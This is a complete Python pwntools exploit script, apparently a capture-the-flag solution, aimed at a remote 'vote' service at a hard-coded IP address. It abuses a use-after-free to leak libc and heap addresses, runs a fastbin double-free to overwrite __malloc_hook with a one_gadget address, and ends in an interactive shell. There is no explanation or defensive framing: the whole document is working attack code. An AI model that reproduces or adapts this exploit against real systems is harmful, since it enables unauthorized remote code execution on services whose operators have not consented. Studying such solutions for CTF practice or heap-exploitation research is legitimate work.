from pwn import *
import time, sys

#p = process(["./vote"], env={"LD_PRELOAD":"./libc-2.23.so"})
libc = ELF("./libc-2.23.so")
binary = ELF("./vote")
context.binary = "./vote"
p = remote("47.97.190.1", "6000")

#context.log_level = "debug"

def create(size, name):
    p.sendlineafter("Action: ", "0")
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("name: ")
    p.send(name)

def show(index):
    p.sendlineafter("Action: ", "1")
    p.sendlineafter("index: ", str(index))

def vote(index):
    p.sendlineafter("Action: ", "2")
    p.sendlineafter("index: ", str(index))

def result():
    p.sendlineafter("Action: ", "3")

def cancel(index):
    p.sendlineafter("Action: ", "4")
    p.sendlineafter("index: ", str(index))

create(0x80, "A" * 0x80)
create(0x80, "B" * 0x80)
create(0x80, "C" * 0x80)
create(0x80, "D" * 0x80)
cancel(0)
show(0)
p.recvuntil("count: ")
leak = int(p.recvuntil("\n")[:-1])
libc_base = leak - 0x3c4b78         # remote
#libc_base = leak - 0x3c4b78
#system = libc_base + 0x45390
system = libc_base + libc.symbols["system"]     # remote
binsh = libc_base + 0x18cd17        # remote
print hex(leak)
print hex(libc_base)
print "system : " + hex(system)
print "/bin/sh : " + hex(binsh)

cancel(2)
show(2)
p.recvuntil("count: ")
heap_base = int(p.recvuntil("\n")[:-1])
print "heap base : " + hex(heap_base)

##############
create(0x80, "A" * 0x80)
vote(0)
time.sleep(3)
cancel(0)
create(0x80, "A" * 0x80)

create(0x80, "C" * 0x80)
vote(3)
time.sleep(3)
cancel(3)
create(0x80, "C" * 0x80)

##############


# fastbin attack
# stdout -> 0x6020c0

create(0x58, p64(0x71) * (0x58 / 8))
create(0x58, p64(0x71) * (0x58 / 8))
create(0x58, p64(0x71) * (0x58 / 8))

cancel(8)
cancel(7)
cancel(8)

create(0x58, p64(0x71) * (0x58 / 8))
cancel(8)

for i in xrange(0x30):
    vote(7)

create(0x58, p64(0x71) * 4 + p64(libc_base + 0x3c4aed) + p64(0x71) * 6) 
create(0x58, p64(0x71) * 11)
create(0x58, p64(0x71) * 11)

# overwrite __malloc_hook
create(0x58, "A" * 0x3 + p64(libc_base + 0xf0274) * 4 + "\n")
p.sendline("0")
p.sendline("50")

p.interactive()
